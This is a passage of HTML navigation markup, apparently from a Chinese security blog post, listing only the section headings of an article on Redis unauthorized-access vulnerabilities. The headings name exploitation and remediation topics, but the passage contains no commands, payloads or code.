href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-text">Redis未授权漏洞的修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4"><span class="toc-text">禁止高危命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E4%BD%8E%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8CRedis%E6%9C%8D%E5%8A%A1"><span class="toc-text">以低权限运行Redis服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BARedis%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="toc-text">为Redis添加密码验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AERedis"><span class="toc-text">禁止外网访问Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-text">修改默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E8%AF%81-authorized-keys-%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-text">保证 authorized_keys 文件的安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5"><span class="toc-text">设置防火墙策略</span></a></li></ol></li></ol></li></ol>
   </article>
   
   
